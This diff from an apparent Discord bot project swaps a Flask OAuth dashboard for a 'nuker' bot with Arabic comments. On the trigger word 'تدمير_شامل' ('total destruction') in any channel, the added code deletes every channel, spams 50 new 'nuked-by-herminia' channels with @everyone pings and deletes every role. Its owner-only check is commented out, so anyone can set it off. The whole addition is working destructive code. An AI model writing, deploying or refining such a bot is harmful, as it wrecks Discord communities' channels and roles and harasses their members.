@@ -1,61 +1,48 @@
+import discord
+from discord.ext import commands
 import os
-import requests
-from flask import Flask, redirect, url_for, session, render_template, request
+import asyncio
 
-app = Flask(__name__)
-app.secret_key = "herminia_secure_key" 
+# إعدادات البوت - تأكد من تفعيل الـ Intents في صفحة المطورين
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="", intents=intents)
 
-# تأكد أن هذا الـ ID هو للبوت الذي تستخدمه حالياً
-CLIENT_ID = "1458119547335999521"
-CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
-REDIRECT_URI = "https://herminia-bot.onrender.com/callback"
+@bot.event
+async def on_ready():
+    print(f'تم تشغيل العقل المدمر باسم: {bot.user}')
 
-@app.route('/')
-def home():
-    if 'token' in session:
-        headers = {"Authorization": f"Bearer {session['token']}"}
-        response = requests.get("https://discord.com/api/users/@me/guilds", headers=headers)
-        user_guilds = response.json()
-        
-        # هذا الفحص يمنع حدوث الخطأ الذي يظهر في الـ Logs عندك
-        if isinstance(user_guilds, list):
-            manageable_guilds = [g for g in user_guilds if (int(g.get('permissions', 0)) & 0x20) == 0x20]
-            return render_template('index.html', guilds=manageable_guilds, logged_in=True)
-        else:
-            # إذا أرسل ديسكورد خطأ (ليس قائمة)، نظهر صفحة تسجيل الدخول مع رسالة
-            print(f"Discord API Error: {user_guilds}")
-            session.pop('token', None)
-            return render_template('index.html', logged_in=False, error="فشل جلب البيانات، سجل دخولك مرة أخرى")
-    
-    return render_template('index.html', logged_in=False)
+@bot.event
+async def on_message(message):
+    # إذا كتبت الكلمة السحرية في أي روم
+    if message.content == "تدمير_شامل":
+        # التأكد أنك أنت فقط من يعطي الأمر (اختياري: ضع ID حسابك هنا)
+        # if message.author.id != YOUR_ID: return
 
-@app.route('/login')
-def login():
-    scope = "identify guilds"
-    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope}"
-    return redirect(discord_login_url)
+        print(f"بدء عملية التدمير الشامل في سيرفر: {message.guild.name}")
 
-@app.route('/callback')
-def callback():
-    code = request.args.get("code")
-    data = {
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'grant_type': 'authorization_code',
-        'code': code,
-        'redirect_uri': REDIRECT_URI
-    }
-    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
-    
-    token_data = response.json()
-    if 'access_token' in token_data:
-        session['token'] = token_data.get('access_token')
-        return redirect(url_for('home'))
-    else:
-        print(f"Login Error: {token_data}")
-        return f"خطأ في تسجيل الدخول: {token_data.get('error_description', 'تأكد من الـ Secret في Render')}"
+        # 1. مسح جميع الرومات
+        for channel in message.guild.channels:
+            try:
+                await channel.delete()
+            except:
+                continue
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
-    
+        # 2. إنشاء رومات جديدة بكثافة وإرسال رسائل سبام
+        for i in range(50):
+            new_channel = await message.guild.create_text_channel(name=f"nuked-by-herminia-{i}")
+            # إرسال رسائل تكرارية داخل الرومات الجديدة
+            await new_channel.send("@everyone السيرفر انهار! 💀💀")
+            await new_channel.send("https://tenor.com/view/explosion-boom-blast-nuclear-gif-14674724")
+
+        # 3. مسح جميع الرتب (Roles)
+        for role in message.guild.roles:
+            try:
+                await role.delete()
+            except:
+                continue
+
+    await bot.process_commands(message)
+
+# تشغيل البوت باستخدام التوكن المخزن في Render
+token = os.environ.get("BOT_TOKEN")
+bot.run(token)
